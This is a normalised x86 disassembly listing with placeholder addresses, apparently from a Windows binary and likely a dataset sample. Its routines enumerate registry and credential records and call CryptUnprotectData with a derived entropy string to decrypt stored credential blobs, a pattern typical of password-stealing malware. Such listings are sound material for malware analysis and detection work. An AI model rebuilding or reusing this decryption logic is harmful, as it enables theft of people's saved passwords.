jmp r-xdata
push [ ebp - 0x24 ]
call [ LocalFree@IAT ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x24
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x24 ]
add ecx [ eax ]
mov eax [ ebp - 0x58 ]
add ecx [ eax + 0x4 ]
mov [ ebp - 0x50 ] ecx
and [ ebp - 0x60 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x58 ]
mov eax [ eax + 0x14 ]
shr eax 0x1
cmp [ ebp - 0x60 ] eax
jae r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x50 ]
add ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x10
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x50 ]
add ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x10
mov [ ebp - 0x20 ] eax
push 0x0
mov eax [ ebp - 0x18 ]
push [ eax + 0x80 ]
push 0x0
push [ ebp - 0x54 ]
push [ ebp - 0x30 ]
mov edx r--data
mov ecx [ ebp - 0x4c ]
call sub_414e54
jmp r-xdata
mov eax [ ebp - 0x60 ]
inc eax
mov [ ebp - 0x60 ] eax
sub_418f19
push ebp
mov ebp esp
sub esp 0x14
mov ecx rw-data
call sub_401ca3
push [ ebp + 0x8 ]
push sub_4184db
push 0x1
push 0x1
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_40feb4
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x10 ] eax
jge r-xdata
leave
retn
push [ ebp - 0x10 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x100 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov [ ebp - 0x8 ] r--data
jmp r-xdata
cmp [ ebp - 0x14 ] 0x2
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push [ eax + 0x204 ]
mov eax [ ebp - 0x4 ]
add eax 0x408
push eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_414d2b
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
add eax 0x104
push eax
push [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x408
push eax
mov eax [ ebp - 0x4 ]
add eax 0x308
push eax
mov eax [ ebp - 0x4 ]
add eax 0x208
push eax
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x8 ] r--data
jmp r-xdata
cmp [ ebp - 0x14 ] 0x3
je r-xdata
jmp r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov [ ebp - 0x8 ] r--data
jmp r-xdata
cmp [ ebp - 0x14 ] 0x4
je r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] r--data
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
sub_419039
push ebp
mov ebp esp
push 0xffffffff
push sub_423bc9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xcc
push esi
push edi
lea ecx [ ebp - 0x74 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x64 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
mov eax rw-data
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x88 ]
push eax
call [ rw-data ]
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov [ ebp - 0xb9 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x64 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x74 ]
call sub_4010a3
mov al [ ebp - 0xb9 ]
jmp r-xdata
lea eax [ ebp - 0x98 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
push [ ebp - 0x88 ]
call [ eax + 0x38 ]
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov [ ebp - 0xba ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x64 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x74 ]
call sub_4010a3
mov al [ ebp - 0xba ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
leave
retn
mov ecx rw-data
call sub_401ca3
mov [ ebp - 0xbb ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x64 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x74 ]
call sub_4010a3
mov al [ ebp - 0xbb ]
jmp r-xdata
and [ ebp - 0xa4 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
push [ ebp - 0x88 ]
call [ eax + 0x3c ]
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0xa4 ] eax
jge r-xdata
push 0x0
lea eax [ ebp - 0x9c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
push [ ebp - 0x88 ]
call [ eax + 0x1c ]
mov [ ebp - 0x78 ] eax
push 0x24
pop edx
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx rw-data
call sub_4011f7
test eax eax
jle r-xdata
push [ ebp - 0xa4 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x54 ] eax
and [ ebp - 0xa8 ] 0x0
jmp r-xdata
push [ ebp - 0x54 ]
push 0x24
call sub_40259d
pop ecx
pop ecx
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0xc4 ] 0x0
je r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov eax [ ebp - 0x98 ]
mov eax [ eax ]
push [ ebp - 0x98 ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov [ ebp - 0xcd ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x64 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x74 ]
call sub_4010a3
mov al [ ebp - 0xcd ]
lea ecx [ ebp - 0x74 ]
call sub_4106f0
mov ecx rw-data
call sub_4011f7
push eax
lea ecx [ ebp - 0x74 ]
call sub_410af3
and [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x54 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0xa8 ] eax
jge r-xdata
and [ ebp - 0xd4 ] 0x0
mov ecx [ ebp - 0xc4 ]
call sub_4025aa
mov [ ebp - 0xd4 ] eax
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0xb0 ] eax
jge r-xdata
jmp r-xdata
push [ ebp - 0xa8 ]
mov ecx [ ebp - 0x54 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x94 ] eax
and [ ebp - 0xac ] 0x0
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
push [ ebp - 0x24 ]
call [ eax + 0x8 ]
mov ecx [ ebp - 0x54 ]
add ecx 0x10
mov edx [ ebp - 0x94 ]
call sub_401cb4
mov edx [ ebp - 0x54 ]
mov ecx rw-data
call sub_401cb4
jmp r-xdata
push 0x0
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
push [ ebp - 0x88 ]
call [ eax + 0x28 ]
mov [ ebp - 0x78 ] eax
push 0x24
pop edx
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
jne r-xdata
mov eax [ ebp - 0xd4 ]
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x20 ]
mov edi [ ebp - 0x54 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x54 ]
add ecx 0x10
call sub_401ca3
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x9c ]
mov [ eax + 0x20 ] ecx
lea ecx [ ebp - 0x74 ]
call sub_401000
push eax
lea ecx [ ebp - 0x74 ]
call sub_410ad8
lea ecx [ ebp - 0x74 ]
call sub_401000
push eax
push 0x0
push 0xa
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x80700001
lea ecx [ ebp - 0x74 ]
call sub_401000
push eax
lea ecx [ ebp - 0x74 ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
push [ ebp - 0xb0 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x54 ] eax
push 0x0
push 0x10
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x74 ]
call sub_410811
mov eax [ ebp - 0x54 ]
mov eax [ eax + 0x20 ]
push [ eax + 0x4 ]
lea ecx [ ebp - 0x74 ]
call sub_401345
mov ecx [ ebp - 0x54 ]
add ecx 0x10
call sub_4011f7
push eax
lea ecx [ ebp - 0x74 ]
call sub_410af3
and [ ebp - 0xb4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa4 ]
inc eax
mov [ ebp - 0xa4 ] eax
mov ecx [ ebp - 0x94 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0xac ] eax
jge r-xdata
push [ ebp - 0x94 ]
push 0x24
call sub_40259d
pop ecx
pop ecx
mov [ ebp - 0xcc ] eax
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0xcc ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x54 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0xb4 ] eax
jge r-xdata
jmp r-xdata
push [ ebp - 0xac ]
mov ecx [ ebp - 0x94 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x8c ] eax
push 0x0
mov eax [ ebp - 0x8c ]
push [ eax + 0x8 ]
mov eax [ ebp - 0x8c ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_4145dc
mov ecx [ ebp - 0x8c ]
mov [ ecx + 0xc ] al
push rw-data
push [ ebp - 0x54 ]
call sub_40258b
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0xd8 ] 0x0
mov ecx [ ebp - 0xcc ]
call sub_4025aa
mov [ ebp - 0xd8 ] eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x38 ]
push eax
push 0x1
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
push [ ebp - 0x24 ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0xb4 ]
mov ecx [ ebp - 0x54 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x94 ] eax
push 0x0
push 0x10
push [ ebp - 0x94 ]
lea ecx [ ebp - 0x74 ]
call sub_410811
mov eax [ ebp - 0x94 ]
mov eax [ eax + 0x20 ]
push [ eax + 0x4 ]
lea ecx [ ebp - 0x74 ]
call sub_401345
mov ecx [ ebp - 0x94 ]
add ecx 0x10
call sub_4011f7
push eax
lea ecx [ ebp - 0x74 ]
call sub_410af3
and [ ebp - 0xb8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa8 ]
inc eax
mov [ ebp - 0xa8 ] eax
push rw-data
push [ ebp - 0x54 ]
call sub_40258b
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x90 ]
push eax
push 0x1
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
push [ ebp - 0x50 ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
mov eax [ eax ]
push [ ebp - 0x24 ]
call [ eax + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xd8 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x38 ]
mov edi [ ebp - 0x94 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x94 ]
add ecx 0x10
call sub_401ca3
mov eax [ ebp - 0x94 ]
mov ecx [ ebp - 0x84 ]
mov [ eax + 0x20 ] ecx
lea eax [ ebp - 0x50 ]
push eax
push 0x0
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
push [ ebp - 0x88 ]
call [ eax + 0x54 ]
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0xb0 ]
inc eax
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0x94 ]
add ecx 0x10
call sub_4011f7
cmp [ ebp - 0xb8 ] eax
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ ebp - 0x8c ]
push [ eax + 0x8 ]
mov eax [ ebp - 0x8c ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_414855
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8c ]
push [ eax + 0x8 ]
mov eax [ ebp - 0x8c ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_414855
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
push [ ebp - 0x50 ]
call [ eax + 0x8 ]
jmp r-xdata
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4c ] 0x10
mov [ ebp - 0x48 ] 0x2
and [ ebp - 0x44 ] 0x0
mov [ ebp - 0x40 ] rw-data
push 0x0
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push [ ebp - 0x90 ]
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0x88 ]
mov eax [ eax ]
push [ ebp - 0x88 ]
call [ eax + 0x44 ]
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0xb8 ]
mov ecx [ ebp - 0x94 ]
add ecx 0x10
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x8c ]
push [ eax ]
lea ecx [ ebp - 0x74 ]
call sub_401345
mov eax [ ebp - 0x8c ]
push [ eax + 0x8 ]
lea ecx [ ebp - 0x74 ]
call sub_410af3
push 0x0
mov eax [ ebp - 0x8c ]
push [ eax + 0x8 ]
mov eax [ ebp - 0x8c ]
push [ eax + 0x4 ]
lea ecx [ ebp - 0x74 ]
call sub_410811
jmp r-xdata
mov eax [ ebp - 0xac ]
inc eax
mov [ ebp - 0xac ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x7c ] eax
mov eax [ rw-data ]
mov [ ebp - 0xa0 ] eax
and [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x7c ] eax
mov eax [ rw-data ]
mov [ ebp - 0xa0 ] eax
and [ ebp - 0x10 ] 0x0
push 0x10
pop edx
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xb4 ]
inc eax
mov [ ebp - 0xb4 ] eax
mov eax [ ebp - 0xb8 ]
inc eax
mov [ ebp - 0xb8 ] eax
cmp [ ebp - 0x10 ] 0x104
jl r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x104
jge r-xdata
mov eax [ ebp - 0x8c ]
mov eax [ eax + 0x8 ]
shr eax 0x1
cmp [ ebp - 0x10 ] eax
jb r-xdata
mov eax [ ebp - 0x7c ]
movzx eax [ eax ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8c ]
mov ecx [ ebp - 0x90 ]
mov [ eax ] ecx
mov eax [ ebp - 0x8c ]
mov ecx [ ebp - 0x28 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x8c ]
mov ecx [ ebp - 0x80 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x94 ]
add ecx 0x10
mov edx [ ebp - 0x8c ]
call sub_401cb4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x7c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x7c ]
movzx eax [ eax ]
cmp eax 0x3a
jne r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x7c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x7c ]
inc eax
inc eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0xa0 ]
inc eax
inc eax
mov [ ebp - 0xa0 ] eax
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov ecx rw-data
call sub_401cb4
push 0x0
mov eax [ ebp - 0x8c ]
push [ eax ]
push 0x0
push [ ebp - 0xa0 ]
push [ ebp - 0x7c ]
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
mov edx [ ebp - 0x3c ]
mov ecx [ ebp + 0x8 ]
call sub_417232
and [ ebp - 0x3c ] 0x0
push 0x0
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x7c ]
inc eax
inc eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x7c ]
and [ eax ] 0x0
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0xa0 ]
inc eax
inc eax
mov [ ebp - 0xa0 ] eax
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov ecx rw-data
call sub_401cb4
push 0x0
mov eax [ ebp - 0x8c ]
push [ eax ]
push 0x0
push [ ebp - 0xa0 ]
push [ ebp - 0x7c ]
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
mov edx [ ebp - 0x3c ]
mov ecx [ ebp + 0x8 ]
call sub_417232
and [ ebp - 0x3c ] 0x0
push 0x0
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8c ]
mov eax [ eax + 0x8 ]
shr eax 0x1
cmp [ ebp - 0x10 ] eax
jae r-xdata
mov eax [ ebp - 0x7c ]
movzx eax [ eax ]
test eax eax
je r-xdata
sub_4199e9
push ebp
mov ebp esp
sub esp 0xf8
mov [ ebp - 0x80 ] r--data
mov [ ebp - 0x14 ] r--data
mov ecx [ ebp + 0x8 ]
call sub_41a144
cmp eax 0x2
jle r-xdata
leave
retn
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
mov eax rw-data
test eax eax
je r-xdata
jmp r-xdata
mov eax rw-data
test eax eax
jne r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x7c ] 0x0
and [ ebp - 0x74 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41a144
cmp eax 0x2
jle r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ ebp - 0x10 ]
push 0x0
call [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
or eax 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x74 ] 0x0
je r-xdata
jmp r-xdata
and [ ebp - 0xf0 ] 0x0
jmp r-xdata
cmp [ ebp - 0xf0 ] 0x25
jge r-xdata
lea eax [ ebp - 0x68 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x4a
and [ ebp - 0xf4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x80 ]
add eax [ ebp - 0xf0 ]
movsx eax [ eax ]
shl eax 0x2
mov ecx [ ebp - 0xf0 ]
mov [ ebp + ecx * 2 - 0x68 ] ax
jmp r-xdata
cmp [ ebp - 0xf4 ] 0x25
jge r-xdata
mov eax [ ebp - 0xf0 ]
inc eax
mov [ ebp - 0xf0 ] eax
lea eax [ ebp - 0xe8 ]
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x88 ] 0x4a
and [ ebp - 0xf8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0xf4 ]
movsx eax [ eax ]
shl eax 0x2
mov ecx [ ebp - 0xf4 ]
mov [ ebp + ecx * 2 - 0xe8 ] ax
jmp r-xdata
mov eax [ ebp - 0xf8 ]
cmp eax [ ebp - 0x7c ]
jae r-xdata
mov eax [ ebp - 0xf4 ]
inc eax
mov [ ebp - 0xf4 ] eax
push [ ebp - 0x74 ]
call [ rw-data ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x94 ] eax
and [ ebp - 0x6c ] 0x0
and [ ebp - 0x70 ] 0x0
lea eax [ ebp - 0x70 ]
push eax
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea eax [ ebp - 0x94 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0x88 ]
push eax
push 0x0
lea eax [ ebp - 0x94 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
push 0x1
push [ ebp - 0x70 ]
mov edx [ ebp - 0x6c ]
mov ecx [ ebp + 0x8 ]
call sub_414855
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x94 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
push 0x1
push [ ebp - 0x70 ]
mov edx [ ebp - 0x6c ]
mov ecx [ ebp + 0x8 ]
call sub_414855
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x6c ] 0x0
je r-xdata
push 0x1
push [ ebp - 0x70 ]
mov edx [ ebp - 0x6c ]
mov ecx [ ebp + 0x8 ]
call sub_414855
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0xc ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x2c ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x8 ]
push [ ebp - 0x78 ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x30 ]
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
mov edx [ ebp - 0x78 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x78 ]
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x8c ] eax
mov eax [ rw-data ]
mov [ ebp - 0xec ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp - 0x6c ]
call [ LocalFree@IAT ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0xc ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x2c ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x8 ]
push [ ebp - 0x78 ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x30 ]
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
mov edx [ ebp - 0x78 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
cmp [ ebp - 0x4 ] 0x104
jl r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x104
jge r-xdata
mov eax [ ebp - 0xf8 ]
inc eax
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x8c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8c ] eax
jmp r-xdata
mov eax [ ebp - 0x8c ]
movzx eax [ eax ]
cmp eax 0x3a
jne r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0xc ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x2c ]
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x74 ]
mov eax [ ecx + eax * 4 ]
push [ eax + 0x8 ]
push [ ebp - 0xec ]
push [ ebp - 0x8c ]
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
mov edx [ ebp - 0x78 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
mov eax [ ebp - 0x8c ]
inc eax
inc eax
mov [ ebp - 0x8c ] eax
jmp r-xdata
mov eax [ ebp - 0x8c ]
and [ eax ] 0x0
mov eax [ ebp - 0x8c ]
mov [ ebp - 0xec ] eax
mov eax [ ebp - 0xec ]
inc eax
inc eax
mov [ ebp - 0xec ] eax
jmp r-xdata
mov eax [ ebp - 0x8c ]
movzx eax [ eax ]
test eax eax
je r-xdata
sub_419e3e
push ebp
mov ebp esp
sub esp 0x48
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0xc ] 0x0
push 0xf0000000
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
leave
retn
and [ ebp - 0x28 ] 0x0
jmp r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x28 ] eax
jge r-xdata
push 0x0
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
push [ ebp + 0x8 ]
push sub_418cd6
push 0x1
push 0x1
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_40feb4
and [ ebp - 0x28 ] 0x0
jmp r-xdata
push [ ebp - 0x28 ]
mov ecx rw-data
call sub_401ccc
mov eax [ eax ]
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x40 ] 0x0
je r-xdata
mov ecx rw-data
call sub_4011f7
